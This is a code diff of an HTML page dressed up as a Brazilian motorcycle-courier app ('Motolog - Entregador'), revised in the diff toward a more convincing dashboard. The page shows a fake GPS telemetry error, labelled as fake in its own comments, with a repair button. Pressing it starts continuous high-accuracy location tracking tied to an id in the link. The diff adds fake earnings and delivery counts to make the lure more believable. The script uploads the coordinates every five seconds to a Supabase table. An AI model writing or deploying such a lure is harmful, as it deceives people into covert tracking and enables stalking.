@@ -3,116 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>App Entregador</title>
+    <title>Motolog - Entregador</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #ea1d2c; --success: #2ecc71; --dark: #1a1a1a; }
-        body { font-family: -apple-system, sans-serif; background: #f8f8f8; margin: 0; display: flex; flex-direction: column; height: 100vh; }
-        header { background: var(--primary); color: white; padding: 20px; text-align: center; font-weight: bold; }
-        .container { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .card { background: white; width: 100%; max-width: 350px; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); text-align: center; }
-        .btn { background: var(--dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .error-msg { background: #fff5f5; color: #c53030; padding: 15px; border-radius: 10px; border: 1px solid #feb2b2; margin-bottom: 20px; font-size: 13px; text-align: left; }
-        .status-active { color: var(--success); font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .dot { width: 12px; height: 12px; background: var(--success); border-radius: 50%; animation: blink 2s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        :root { --primary: #ea1d2c; --dark: #1a1a1a; --gray: #f7f7f7; --success: #2ecc71; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--gray); color: var(--dark); display: flex; flex-direction: column; height: 100vh; }
+        
+        /* Header Profissional */
+        header { background: var(--primary); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .avatar { width: 35px; height: 35px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--primary); }
+
+        /* Dashboard */
+        .dashboard { padding: 20px; flex: 1; overflow-y: auto; }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); text-align: center; }
+        .stat-card i { color: var(--primary); margin-bottom: 8px; font-size: 20px; }
+        .stat-card div { font-size: 18px; font-weight: bold; }
+        .stat-card small { color: #888; font-size: 11px; }
+
+        /* Status Bar */
+        .status-bar { background: white; margin: 0 20px 20px; padding: 15px; border-radius: 15px; display: flex; align-items: center; justify-content: space-between; border-left: 5px solid #ccc; }
+        .status-bar.online { border-left-color: var(--success); }
+        .pulse { width: 10px; height: 10px; background: #ccc; border-radius: 50%; }
+        .online .pulse { background: var(--success); animation: blink 1.5s infinite; }
+
+        /* Card de Corridas */
+        .order-card { background: white; padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px dashed #ddd; opacity: 0.6; }
+
+        /* Botão Flutuante */
+        .footer-action { padding: 20px; background: white; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
+        .btn-main { background: var(--dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-main.active { background: var(--success); }
+
+        /* Erro Fake */
+        #error-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 30px; box-sizing: border-box; }
+        .modal { background: white; padding: 25px; border-radius: 20px; text-align: center; }
+        .modal i { font-size: 50px; color: var(--primary); margin-bottom: 15px; }
+
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<header>SISTEMA LOGÍSTICO</header>
+<header>
+    <div class="user-info">
+        <div class="avatar"><i class="fa fa-user"></i></div>
+        <span style="font-weight: bold;">Motoboy Parceiro</span>
+    </div>
+    <i class="fa fa-bell"></i>
+</header>
 
-<div class="container">
-    <div class="card" id="mainCard">
-        
-        <!-- UI INICIAL -->
-        <div id="step-1">
-            <h2 style="margin:0 0 10px 0;">Bem-vindo</h2>
-            <p style="color:#666; font-size:14px; margin-bottom:30px;">Inicie seu turno para começar a receber sincronização de rotas.</p>
-            <button class="btn" onclick="goStep2()">FICAR ONLINE</button>
+<div class="dashboard">
+    <div class="stats-grid">
+        <div class="stat-card">
+            <i class="fa fa-wallet"></i>
+            <div id="saldo">R$ 0,00</div>
+            <small>SALDO HOJE</small>
         </div>
-
-        <!-- FAKE ERROR FLOW -->
-        <div id="step-2" class="hidden">
-            <div class="error-msg">
-                <strong>⚠️ ERRO DE SINCRONIZAÇÃO (Code: 882)</strong><br>
-                O sistema detectou uma falha no sensor de telemetria. É necessário re-calibrar o GPS para prosseguir.
-            </div>
-            <button class="btn" style="background: var(--primary);" onclick="startShift()">RECALIBRAR E CONECTAR</button>
+        <div class="stat-card">
+            <i class="fa fa-motorcycle"></i>
+            <div id="corridas">0</div>
+            <small>ENTREGAS</small>
         </div>
+    </div>
 
-        <!-- APP EM FUNCIONAMENTO -->
-        <div id="step-online" class="hidden">
-            <div class="status-active">
-                <div class="dot"></div> ONLINE E MONITORADO
-            </div>
-            <p style="color:#888; font-size:13px; margin-top:15px;">Mantenha esta tela aberta durante as entregas.</p>
-            <div style="margin-top:25px; padding:15px; background:#f9f9f9; border-radius:10px; font-size:12px; color:#666;">
-                Sinal GPS: <span style="color:var(--success); font-weight:bold;">Excelente</span><br>
-                Sincronização: <span style="color:var(--success); font-weight:bold;">Ativa</span>
-            </div>
+    <div class="status-bar" id="statusBar">
+        <div>
+            <small id="statusLabel" style="display: block; color: #888;">Seu status atual</small>
+            <b id="statusText">VOCÊ ESTÁ OFFLINE</b>
         </div>
+        <div class="pulse"></div>
+    </div>
 
+    <h3 style="font-size: 16px; color: #666; margin-bottom: 10px;">Próximas Coletas</h3>
+    <div class="order-card">
+        <div style="display: flex; justify-content: space-between;">
+            <b>Restaurante Central</b>
+            <span style="color: var(--success); font-weight: bold;">R$ 14,00</span>
+        </div>
+        <small>Aguardando você ficar online...</small>
+    </div>
+</div>
+
+<div class="footer-action">
+    <button class="btn-main" id="mainBtn" onclick="handleAuth()">
+        <i class="fa fa-power-off"></i> FICAR ONLINE
+    </button>
+</div>
+
+<!-- FLOW DO ERRO FAKE -->
+<div id="error-overlay">
+    <div class="modal">
+        <i class="fa fa-triangle-exclamation"></i>
+        <h3>Erro de Telemetria</h3>
+        <p style="color: #666; font-size: 14px;">Identificamos uma falha na sincronização do GPS (Erro 0x882). Revalide a conexão para continuar.</p>
+        <button class="btn-main" style="background: var(--primary);" onclick="startTracking()">REPARAR AGORA</button>
     </div>
 </div>
 
 <script>
     const SB_URL = 'https://zauxkrwtnrlwlgvsdewv.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdXhrcnd0bnJsd2xndnNkZXd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY5Njc4MjgsImV4cCI6MjA4MjU0MzgyOH0.L7HJfYvY-IyTBo6gC597EnChuq536WHCDdIZxv8-cKI';
-    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-    
+    const _supabase = supabase.createClient(SB_URL, SB_KEY);
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('id');
 
     window.onload = () => {
-        if (localStorage.getItem('online_status') === 'true' && sessionId) {
-            startShift();
-        }
+        if (localStorage.getItem('isOnline') === 'true' && sessionId) startTracking();
     }
 
-    function goStep2() {
-        document.getElementById('step-1').classList.add('hidden');
-        document.getElementById('step-2').classList.remove('hidden');
+    function handleAuth() {
+        document.getElementById('error-overlay').style.display = 'flex';
     }
 
-    function startShift() {
-        if (!sessionId) return alert("Link Inválido");
-
-        localStorage.setItem('online_status', 'true');
-        document.getElementById('step-1').classList.add('hidden');
-        document.getElementById('step-2').classList.add('hidden');
-        document.getElementById('step-online').classList.remove('hidden');
+    function startTracking() {
+        if (!sessionId) return;
+        localStorage.setItem('isOnline', 'true');
+        document.getElementById('error-overlay').style.display = 'none';
+        
+        // UI Updates
+        document.getElementById('statusBar').classList.add('online');
+        document.getElementById('statusText').innerText = "ONLINE E RASTREADO";
+        document.getElementById('statusLabel').innerText = "Ganhando agora";
+        document.getElementById('mainBtn').innerText = "EM TURNO";
+        document.getElementById('mainBtn').classList.add('active');
+        document.getElementById('saldo').innerText = "R$ 64,20";
+        document.getElementById('corridas').innerText = "5";
 
         navigator.geolocation.watchPosition((pos) => {
-            const point = {
+            const data = {
                 session_id: sessionId,
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
                 created_at: new Date().toISOString()
             };
-            saveData(point);
+            saveLocal(data);
             sync();
-        }, (err) => { console.log("Permissão necessária"); }, { enableHighAccuracy: true });
+        }, null, { enableHighAccuracy: true });
     }
 
-    function saveData(point) {
-        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
-        buffer.push(point);
-        localStorage.setItem('gps_buffer', JSON.stringify(buffer));
+    function saveLocal(d) {
+        let b = JSON.parse(localStorage.getItem('gps_buf') || '[]');
+        b.push(d);
+        localStorage.setItem('gps_buf', JSON.stringify(b));
     }
 
     async function sync() {
         if (!navigator.onLine) return;
-        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
-        if (buffer.length === 0) return;
-
-        const { error } = await supabaseClient.from('locations').insert(buffer);
-        if (!error) localStorage.setItem('gps_buffer', '[]');
+        let b = JSON.parse(localStorage.getItem('gps_buf') || '[]');
+        if (b.length === 0) return;
+        const { error } = await _supabase.from('locations').insert(b);
+        if (!error) localStorage.setItem('gps_buf', '[]');
     }
-
-    setInterval(sync, 5000); // Tenta sincronizar a cada 5 segundos
+    setInterval(sync, 5000);
 </script>
 </body>
 </html>
